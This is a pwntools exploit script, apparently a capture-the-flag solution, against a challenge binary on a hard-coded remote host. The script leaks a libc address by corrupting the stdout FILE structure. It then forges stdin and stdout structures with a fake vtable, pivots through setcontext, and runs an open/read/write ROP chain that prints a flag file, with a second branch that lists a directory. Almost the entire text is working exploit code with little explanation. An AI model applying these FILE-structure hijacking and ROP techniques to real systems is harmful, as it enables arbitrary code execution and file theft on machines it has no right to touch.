#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 11106 ./chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
host = args.HOST or '188.166.177.88'

port = int(args.PORT or 11102)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv,aslr=0, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
dir /root/Desktop/libc/glibc-2.27/libio/
continue
# b *edit+152
# b *add+77
# c
# c
# c

# b *readint+42
# c
# b *read+15
# c
# c

# b *menu+30
# c
# b *puts+202
# c
# b *__GI__IO_do_write+173
# c

# b *readint+42
# c
# b *read+15
# c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

# File Struct stdout dan stdin
# Vtable

io = start()

def add():
    io.sendlineafter("> ","1")
    io.sendlineafter(": ",str(0x200000))
    io.sendafter(": ","a"*20)

def edit(start,msg,noafter=1):
    if noafter:
        io.sendlineafter("> ","2")
    else:
        io.sendline("2")
    if noafter:
        io.sendlineafter(": ",str(start))
    else:
        io.sendline(str(start))
    if noafter:
        io.sendafter(": ",msg)
    else:
        io.send(msg)


libc = ELF("./libc-2.29.so")
# libc = exe.libc

idx_stdout  = libc.sym["_IO_2_1_stdout_"]
idx_stdin   = libc.sym["_IO_2_1_stdin_"]
# x/40gx &_IO_2_1_stdin_
# x/40gx &_IO_2_1_stdout_
add()

# x/30gx &_IO_2_1_stdout_
# b *menu+30
# b *puts+202 (_IO_new_file_xsputn) 0x38
# b *__GI__IO_file_xsputn+290 (_IO_new_file_overflow) 0x18
# b *__GI__IO_file_xsputn+446
# b *__GI__IO_file_overflow+262
# b *__GI__IO_do_write+173 (_IO_new_file_write) 0x78

edit(0x204000-0x10+ idx_stdout+16,'\x08') # _IO_read_end

edit(0x204000-0x10+ idx_stdout+32,'\x08') # _IO_write_base

leak = u64(io.recv(6).ljust(8,b"\x00"))
print ("leak:",hex(leak))
libc.address = leak - libc.sym['_IO_stdfile_2_lock']
# libc.address = leak - 0x1be980 
print ("libc base:",hex(libc.address))

_IO_2_1_STDIN_ = libc.sym['_IO_2_1_stdin_']
_IO_2_1_STDOUT_ = libc.sym['_IO_2_1_stdout_']
_IO_2_1_STDERR_ = libc.sym['_IO_2_1_stderr_']

print ("_IO_2_1_STDIN_:",hex(_IO_2_1_STDIN_))
print ("_IO_2_1_STDOUT_:",hex(_IO_2_1_STDOUT_))
print ("_IO_2_1_STDERR_:",hex(_IO_2_1_STDERR_))

_IO_HELPER_JUMPS = _IO_2_1_STDIN_+0xf60

_IO_STDFILE_1_LOCK = _IO_2_1_STDOUT_ + 0x1e20
_IO_WIDE_DATA_1 = _IO_2_1_STDOUT_ - 0xea0

print (hex(_IO_HELPER_JUMPS))
print (hex(_IO_STDFILE_1_LOCK))
print (hex(_IO_WIDE_DATA_1))

# _IO_HELPER_JUMPS = libc.sym['_IO_helper_jumps']

# _IO_STDFILE_1_LOCK = libc.sym['_IO_stdfile_1_lock']
# _IO_WIDE_DATA_1 = libc.sym['_IO_wide_data_1']

# print ((libc.sym['_IO_helper_jumps']))
# print (hex(libc.sym['_IO_stdfile_1_lock']))
# print (hex(libc.sym['_IO_wide_data_1']))

SETCONTEXT_SPITVOT = libc.sym['setcontext'] + 0x35

pop_rax = libc.address + 0x0000000000047cf8 # pop rax ; ret
pop_rdi = libc.address + 0x0000000000026542 # pop rdi ; ret
pop_rdx = libc.address + 0x000000000012bda6 # pop rdx ; ret
pop_rsi = libc.address + 0x0000000000026f9e # pop rsi ; ret
syscall_ret = libc.address + 0x00000000000cf6c5 # syscall ; ret

def syscall(rax, rdi, rsi, rdx):
    chain = p64(pop_rax) + p64(rax)
    chain += p64(pop_rdi) + p64(rdi)
    chain += p64(pop_rsi) + p64(rsi)
    chain += p64(pop_rdx) + p64(rdx)
    chain += p64(syscall_ret)
    return chain

# # b *readint+42
# # fgets+166
# # _IO_getline_info+165
# # __uflow+145
# # _IO_default_uflow+47
# # __GI__IO_file_underflow+332
# # _IO_file_read+12
# # read+15

# # gdb.attach(io)

edit(0x204000-0x10+idx_stdin+56,'\x00') # _IO_buf_base

# struct IO_file stdin
p = ''
p += p64(0xfbad208b) # _flags sama
p += p64(_IO_2_1_STDOUT_) # _IO_read_ptr (needs to be a valid pointer) 
p += p64(0) * 5 # _IO_read_end - _IO_write_end
p += p64(_IO_2_1_STDOUT_) # _IO_buf_base
p += p64(_IO_2_1_STDOUT_ + 0x1000) # _IO_buf_end, size 0x1000 bytes
p = p.ljust(0x4c, b"\x00")
# p = p.ljust(0x84, b"\x00")
io.send(p)

# sleep(1)

p = ''
# STDOUT
p += p64(0x00000000fbad1800) # _flags sama
p += p64(0) # _IO_read_ptr
p += p64(0) # _IO_read_end
p += p64(0) # _IO_read_base
p += p64(1) # _IO_write_base # change
p += p64(_IO_HELPER_JUMPS+168-0xa0+1) # _IO_write_ptr  =  _IO_write_end # change
p += p64(_IO_HELPER_JUMPS+168-0xa0+1) # _IO_write_end # change
p += p64(0) # _IO_buf_base
p += p64(0) # _IO_buf_end
p += p64(0) # _IO_save_base
p += p64(0) # _IO_backup_base
p += p64(0) # _IO_save_end
p += p64(0) # _markers
p += p64(_IO_2_1_STDIN_) # _chain
p += p32(0) # _fileno
p += p32(0) # _flags2
p += p64(-0x1, signed=True) # _old_offset
p += p16(0) # _cur_column
p += p8(0) # _vtable_offset
p += p8(0) # _shortbuf
p += p32(0) # _shortbuf
p += p64(_IO_STDFILE_1_LOCK) # _lock _IO_STDFILE_1_LOCK
p += p64(-0x1, signed=True) # _offset
p += p64(0) # _codecvt
p += p64(_IO_WIDE_DATA_1) # _wide_data _IO_WIDE_DATA_1
p += p64(0) # _freeres_list
p += p64(0) # _freeres_buf
p += p64(0) # __pad5
p += p32(-0x1, signed=True) # _mode
p += p32(0) # _unused2
p += p64(0) # _unused2
p += p64(0) # _unused2
p += p64(_IO_HELPER_JUMPS) # vtable

# f->_IO_write_end <= f->_IO_write_ptr
# (f->_flags & _IO_CURRENTLY_PUTTING(0x0800)) == 1 || f->_IO_write_base != NULL
# fp->_IO_read_end == fp->_IO_write_base or fp->_flags & _IO_IS_APPENDING(0x1000)

p += p64(_IO_2_1_STDERR_) # stderr
p += p64(_IO_2_1_STDOUT_) # stdout
p += p64(_IO_2_1_STDIN_) # stdin
p += p64(0)

p += p64(0)*(0x1f) # __elf_set___libc_subfreeres
p += p64(0)

# vtable IO_HELPER_JUMPS
p += p64(0)*3
p += p64(libc.sym['_IO_new_file_overflow'])
p += p64(0)*3
p += p64(libc.sym['_IO_new_file_xsputn'])
p += p64(0)*7
p += p64(SETCONTEXT_SPITVOT) # _IO_helper_jumps SETCONTEXT (p64(libc.sym['_IO_new_file_write']))
p += p64(0)*5

# rop chain
size=0x100
bss = _IO_HELPER_JUMPS+0x1d0
rop_addr = _IO_HELPER_JUMPS+0xa8

read=1
if read:
    rop = syscall(257, 0xffffffffffffff9c, bss, 0)
    rop += syscall(0, 3, bss, size)
    rop += syscall(1, 1, bss, size)
    rop = rop.ljust(288,"\x00")
    # rop += '/home/ezfile2/flag-19fcd7006243b983b7b70bc36315e9d6.txt'.ljust(40,"\x00")
    rop += "./flag.txt".ljust(40,"\x00") # bss

else:
    # ls
    rop = syscall(257, 0xffffffffffffff9c, bss, 0)
    rop += syscall(78, 3, bss, size)
    rop += syscall(0, 3, bss, size)
    rop += syscall(1, 1, bss, size)
    rop = rop.ljust(288,"\x00")
    rop += '/home/ezfile2'.ljust(40,"\x00")
    # rop += '/home/ezfile/'.ljust(40,"\x00")

p += p64(rop_addr) + rop

# io.send(p)

# b * __GI__IO_file_xsputn+446
# b *puts+202
# b *_IO_new_do_write+173
# __GI__IO_file_xsputn+446
# __GI__IO_file_overflow+262

io.interactive()
